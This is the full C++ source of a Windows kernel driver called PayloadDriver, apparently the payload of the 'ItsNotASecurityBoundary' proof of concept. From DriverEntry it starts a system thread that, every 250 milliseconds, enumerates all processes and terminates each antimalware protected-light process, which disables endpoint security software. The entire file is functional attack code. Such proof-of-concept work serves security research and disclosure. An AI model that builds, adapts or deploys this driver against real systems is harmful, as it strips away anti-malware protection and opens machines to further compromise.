
#include "PayloadDriver.h"

#pragma warning(disable: 4996) // warning C4996: 'ExAllocatePool': was declared deprecated

KEVENT gShutdownEvent = { 0 };
HANDLE ghKillerThread = NULL;

VOID
GetBasename(
    _In_ PCUNICODE_STRING pFullPath,
    _Out_ PUNICODE_STRING pBasename
)
{
    wchar_t* pLastSlash;

    // Special case if pFullPath->Length is 0
    if (0 == pFullPath->Length)
    {
        pBasename->Buffer = pFullPath->Buffer;
        pBasename->Length = pFullPath->Length;
        pBasename->MaximumLength = pFullPath->MaximumLength;

        return;
    }

    // Extract the basename
    for (pLastSlash = pFullPath->Buffer + (pFullPath->Length / sizeof(WCHAR) - 1);
        pLastSlash != pFullPath->Buffer && *pLastSlash && *pLastSlash != L'\\';
        pLastSlash--
        );

    if (*pLastSlash == L'\\')
    {
        // We found a backslash
        pLastSlash++;
    }
    else
    {
        // Use the full path
        pLastSlash = pFullPath->Buffer;
    }
    pBasename->Buffer = pLastSlash;
    pBasename->Length = (USHORT)(pFullPath->Length - (((PUCHAR)pLastSlash) - ((PUCHAR)pFullPath->Buffer)));
    pBasename->MaximumLength = pBasename->Length;
}

void DriverUnload(
    _DRIVER_OBJECT* DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    // Join killer thread
    KeSetEvent(&gShutdownEvent, 0, TRUE);
    ZwWaitForSingleObject(ghKillerThread, FALSE, NULL);
    ZwClose(ghKillerThread);
}

NTSTATUS KillProcessIfAMPPL(HANDLE ProcessId)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    HANDLE hProcess = NULL;
    ULONG returnLength = 0;
    PS_PROTECTION protection{};
    CLIENT_ID clientId = { ProcessId, NULL };
    OBJECT_ATTRIBUTES objAttr{};
    PEPROCESS pProcess = NULL;
    PUNICODE_STRING pProcessName = NULL;
    UNICODE_STRING processBaseName = { 0 };
    
    InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    CleanUpWithStatusIfFailed(ZwOpenProcess(&hProcess, 0, &objAttr, &clientId));

    // Only target AM-PPL
    CleanUpWithStatusIfFailed(ZwQueryInformationProcess(hProcess, ProcessProtectionInformation, &protection, sizeof(protection), &returnLength));
    CleanUpWithStatusIf((PsProtectedTypeProtectedLight != protection.Type) || (PsProtectedSignerAntimalware != protection.Signer), STATUS_SUCCESS);
    
    // Kill it
    CleanUpWithStatusIfFailed(ZwTerminateProcess(hProcess, STATUS_VIRUS_INFECTED));

    // Get name for log message
    CleanUpWithStatusIfFailed(ObReferenceObjectByHandle(hProcess, 0, *PsProcessType, KernelMode, (PVOID*)&pProcess, NULL));
    CleanUpWithStatusIfFailed(SeLocateProcessImageName(pProcess, &pProcessName));
    GetBasename(pProcessName, &processBaseName);

    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, "ItsNotASecurityBoundary PayloadDriver: Killed AM-PPL: %wZ (%u)\n", &processBaseName, HandleToULong(ProcessId));

Cleanup:
    HandleDelete(hProcess);
    ReferenceDelete(pProcess);
    PoolDelete(pProcessName);

    return ntStatus;
}

NTSTATUS KillAllAMPPL()
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION pAllProcs = NULL;
    ULONG allProcsLength = 1024 * 1024;
    do
    {
        allProcsLength *= 2;

        PoolDelete(pAllProcs);
        pAllProcs = (PSYSTEM_PROCESS_INFORMATION)ExAllocatePool(PagedPool, allProcsLength);
        CleanUpWithStatusIf(!pAllProcs, STATUS_INSUFFICIENT_RESOURCES);

        ntStatus = ZwQuerySystemInformation(SystemProcessInformation, pAllProcs, allProcsLength, &allProcsLength);
    } 
    while (STATUS_INFO_LENGTH_MISMATCH == ntStatus);

    for (PSYSTEM_PROCESS_INFORMATION pProc = pAllProcs; 
        ;
        pProc = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pProc + pProc->NextEntryOffset))
    {
        KillProcessIfAMPPL(pProc->UniqueProcessId);

        if (!pProc->NextEntryOffset)
        {
            break;
        }
    }

Cleanup:
    PoolDelete(pAllProcs);

    return ntStatus;
}

void KillerThreadMain(
    PVOID StartContext
)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    LARGE_INTEGER timeout = { 0 };
    const LONGLONG _1ms = 10000;

    UNREFERENCED_PARAMETER(StartContext);

    timeout.QuadPart = -(250 * _1ms);

    while (true)
    {
        ntStatus = KeWaitForSingleObject(&gShutdownEvent, Executive, KernelMode, FALSE, &timeout);
        switch (ntStatus)
        {
        case STATUS_TIMEOUT:
            KillAllAMPPL();
            break;
        default:
            return;
        }
    }
}

NTSTATUS StartKillerThread()
{
    KeInitializeEvent(&gShutdownEvent, NotificationEvent, FALSE);

    return PsCreateSystemThread(&ghKillerThread, 0, NULL, NULL, NULL, KillerThreadMain, NULL);
}

EXTERN_C NTSTATUS DriverEntry(
    _DRIVER_OBJECT* DriverObject,
    PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, "ItsNotASecurityBoundary PayloadDriver: Hello from the kernel!\n");

    StartKillerThread();

    DriverObject->DriverUnload = DriverUnload;

    return STATUS_SUCCESS;
}
